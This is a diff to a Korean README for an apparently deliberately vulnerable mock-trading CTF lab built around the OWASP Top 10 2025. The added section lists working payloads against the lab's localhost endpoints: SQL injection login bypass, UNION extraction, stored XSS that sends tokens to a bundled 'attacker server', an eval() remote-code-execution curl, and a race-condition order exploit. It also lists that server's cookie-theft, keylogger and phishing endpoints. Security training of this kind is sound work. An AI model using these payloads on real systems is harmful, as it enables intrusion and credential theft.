@@ -11,7 +11,7 @@
 - [설치 및 실행](#-설치-및-실행)
 - [서비스 IA (화면 구성)](#-서비스-ia-화면-구성)
 - [모의투자 로직](#-모의투자-로직)
-- [OWASP Top 10 2025 취약점 가이드](./VULNERABILITIES.md)
+- [OWASP Top 10 2025 취약점 가이드](#-owasp-top-10-2025-취약점)
 - [CTF 플래그](#-ctf-플래그)
 
 ## 🎯 개요
@@ -27,6 +27,7 @@ OWASP Top 10 2025 취약점을 학습하기 위한 CTF 교육 목적으로 개�
 - 📝 **커뮤니티** - 게시판 (공지/자유/Q&A)
 - 🎫 **민원 시스템** - 파일 첨부 지원
 - 👤 **관리자 패널** - 사용자/게시물/민원/로그 관리
+- 🎯 **공격자 서버** - XSS/CSRF 공격 실습용 (port 4000)
 
 ## 🛠 기술 스택
 
@@ -61,11 +62,12 @@ docker-compose up --build
 
 ### 3. 서비스 접속
 
-| 서비스 | URL |
-|--------|-----|
-| **Frontend** | http://localhost:3000 |
-| **Backend API** | http://localhost:5000 |
-| **phpMyAdmin** | http://localhost:8080 |
+| 서비스 | URL | 설명 |
+|--------|-----|------|
+| **Frontend** | http://localhost:3000 | 메인 웹 애플리케이션 |
+| **Backend API** | http://localhost:5000 | REST API 서버 |
+| **Attacker Server** | http://localhost:4000 | XSS/CSRF 공격 실습 |
+| **phpMyAdmin** | http://localhost:8080 | 데이터베이스 관리 |
 
 ### 4. 기본 계정
 
@@ -144,7 +146,203 @@ docker-compose up --build
 | GET | `/api/v2/trade/balance` | 잔고 조회 |
 | POST | `/api/v2/trade/reset` | 모의투자 초기화 |
 
-## 🚩 CTF 플래그
+## � OWASP Top 10 2025 취약점
+
+### 취약점 매핑 및 공격 방법
+
+| 순위 | 취약점 | 구현 위치 | 공격 방법 |
+|------|--------|----------|----------|
+| **A01** | Broken Access Control | IDOR, 관리자 우회 | [상세 보기](#a01-broken-access-control) |
+| **A02** | Security Misconfiguration | CORS, 디버그 모드 | [상세 보기](#a02-security-misconfiguration) |
+| **A03** | Software Supply Chain | 취약한 npm 패키지 | [상세 보기](#a03-software-supply-chain) |
+| **A04** | Cryptographic Failures | 평문 비밀번호, 약한 JWT | [상세 보기](#a04-cryptographic-failures) |
+| **A05** | Injection | SQL Injection, XSS | [상세 보기](#a05-injection) |
+| **A06** | Insecure Design | Race Condition | [상세 보기](#a06-insecure-design) |
+| **A07** | Authentication Failures | 무제한 로그인, 약한 비밀번호 | [상세 보기](#a07-authentication-failures) |
+| **A08** | Data Integrity Failures | eval(), 쿠키 변조 | [상세 보기](#a08-data-integrity-failures) |
+| **A09** | Logging & Alerting | 민감정보 로깅 | [상세 보기](#a09-logging--alerting-failures) |
+| **A10** | Exceptional Conditions | 에러 시 인증 우회 | [상세 보기](#a10-exceptional-conditions) |
+
+---
+
+### A01: Broken Access Control
+
+**취약점**: 사용자 권한을 넘어선 데이터 열람이나 기능 실행
+
+| 공격 | 엔드포인트 | 페이로드 |
+|------|-----------|---------|
+| IDOR 프로필 조회 | `GET /api/auth/profile` | `?id=1`, `?id=2`, `?id=3` |
+| IDOR 잔고 조회 | `GET /api/v2/trade/balance` | `?user_id=1` |
+| IDOR 관심종목 | `GET /api/market/watchlist` | `?user_id=1` |
+| 관리자 헤더 우회 | `GET /api/admin/*` | `X-Admin-Key: admin_bypass_key` |
+
+---
+
+### A02: Security Misconfiguration
+
+**취약점**: 서버나 앱의 설정이 취약하게 유지됨
+
+| 공격 | 설명 | 확인 방법 |
+|------|------|----------|
+| CORS 전체 허용 | 모든 도메인에서 API 호출 가능 | 다른 도메인에서 fetch() |
+| 디버그 모드 | 에러 시 스택 트레이스 노출 | 잘못된 요청 전송 |
+| 서버 정보 노출 | DB 비밀번호, JWT Secret 노출 | `GET /api/utils/server-info` |
+
+---
+
+### A03: Software Supply Chain
+
+**취약점**: 알려진 취약점이 있는 npm 패키지 사용
+
+```bash
+cd backend && npm audit
+```
+
+| 패키지 | 버전 | CVE |
+|--------|------|-----|
+| lodash | 4.17.15 | CVE-2020-8203 (Prototype Pollution) |
+| serialize-javascript | 2.1.0 | CVE-2020-7660 (RCE) |
+| xml2js | 0.4.19 | CVE-2023-0842 (Prototype Pollution) |
+| minimist | 1.2.5 | CVE-2021-44906 (Prototype Pollution) |
+| node-fetch | 2.6.0 | CVE-2022-0235 (Info Exposure) |
+| underscore | 1.12.0 | CVE-2021-23358 (RCE) |
+
+---
+
+### A04: Cryptographic Failures
+
+**취약점**: 평문 데이터 저장, 약한 암호 알고리즘 사용
+
+| 공격 | 확인 방법 |
+|------|----------|
+| 평문 비밀번호 | phpMyAdmin에서 `SELECT email, password FROM users` |
+| 약한 JWT Secret | `super_secret_key_123` - jwt.io에서 변조 가능 |
+| JWT에 민감정보 | 토큰 디코딩 시 password_hash 포함 확인 |
+
+---
+
+### A05: Injection
+
+**취약점**: SQL Injection, XSS
+
+#### SQL Injection
+| 공격 | 엔드포인트 | 페이로드 |
+|------|-----------|---------|
+| 로그인 우회 | `POST /api/auth/login` | `email: admin@kis-trading.com' OR '1'='1' --` |
+| UNION 공격 | `GET /api/market/search` | `?q=' UNION SELECT password FROM users--&source=local` |
+
+#### XSS (Stored)
+```html
+<!-- 게시판 내용에 삽입 -->
+<img src=x onerror=alert(1)>
+
+<!-- 토큰 탈취 (공격자 서버로 전송) -->
+<img src=x onerror="fetch(`http://localhost:4000/token?t=`+localStorage.getItem(`token`))">
+```
+
+---
+
+### A06: Insecure Design
+
+**취약점**: Race Condition (동시성 제어 부재)
+
+```bash
+# 잔고 100만원인데 동시에 100만원씩 2번 주문
+# 트랜잭션 없이 잔고 확인 → 둘 다 통과 → 잔고 마이너스
+curl -X POST http://localhost:5000/api/v2/trade/order \
+  -d '{"user_id":1,"symbol":"AAPL","side":"buy","quantity":1000}' &
+curl -X POST http://localhost:5000/api/v2/trade/order \
+  -d '{"user_id":1,"symbol":"AAPL","side":"buy","quantity":1000}' &
+```
+
+---
+
+### A07: Authentication Failures
+
+**취약점**: 인증 단계의 허점
+
+| 공격 | 설명 | 페이로드 |
+|------|------|---------|
+| 무제한 로그인 | Rate limiting 없음 | 브루트포스 공격 |
+| 약한 비밀번호 | 1자리 비밀번호 허용 | `password: "1"` |
+| 긴 토큰 유효기간 | 365일 유효 | 탈취 시 장기간 악용 |
+| 예측 가능 토큰 | 비밀번호 재설정 토큰 | Base64(email + timestamp) |
+
+---
+
+### A08: Data Integrity Failures
+
+**취약점**: 데이터 변조 방지 실패, 안전하지 않은 역직렬화
+
+#### eval() RCE
+```bash
+# 계산기 API에서 원격 코드 실행
+curl -X POST http://localhost:5000/api/utils/calculate \
+  -H "Content-Type: application/json" \
+  -d '{"expression": "require(`child_process`).execSync(`whoami`).toString()"}'
+```
+
+#### 서명 없는 쿠키 신뢰
+```bash
+# 잘못된 세션 데이터 전송 시 관리자로 인증됨
+curl http://localhost:5000/api/utils/validate-session \
+  -H "X-Session-Data: INVALID_BASE64"
+```
+
+#### 클라이언트 데이터 신뢰
+```bash
+# isAdmin을 클라이언트가 보냄
+curl -X POST http://localhost:5000/api/utils/run-query \
+  -d '{"query": "SELECT * FROM users", "isAdmin": true}'
+```
+
+---
+
+### A09: Logging & Alerting Failures
+
+**취약점**: 민감 정보 로깅, 알림 부재
+
+```bash
+# 백엔드 로그에 비밀번호 노출
+docker logs module_project-backend-1 | grep password
+
+# 로그인 실패에 대한 알림/차단 없음
+```
+
+---
+
+### A10: Exceptional Conditions
+
+**취약점**: 에러 상황에서 시스템 정보 노출 또는 인증 우회
+
+```bash
+# 존재하지 않는 사용자 → 에러 → 관리자 권한 부여
+curl "http://localhost:5000/api/utils/admin-check?userId=99999"
+# 응답: {"isAdmin": true, "role": "admin", "debug": "Error bypass activated"}
+
+# 서버 절대 경로 노출
+curl "http://localhost:5000/api/auth/login" -d '{"email":"test"}'
+# 응답에 스택 트레이스 포함
+```
+
+---
+
+## 🎯 공격자 서버
+
+XSS/CSRF 공격 실습을 위한 서버가 포함되어 있습니다.
+
+| URL | 기능 |
+|-----|------|
+| http://localhost:4000 | 탈취된 데이터 대시보드 |
+| http://localhost:4000/csrf | CSRF 공격 페이지 모음 |
+| http://localhost:4000/steal?cookie=... | 쿠키 탈취 |
+| http://localhost:4000/token?token=... | 토큰 탈취 |
+| http://localhost:4000/keylog?key=... | 키로거 |
+| http://localhost:4000/phish | 피싱 폼 캡처 |
+
+---
+
+## �🚩 CTF 플래그
 
 총 10개의 플래그가 숨겨져 있습니다. 취약점을 발견하고 플래그를 찾으세요!
 
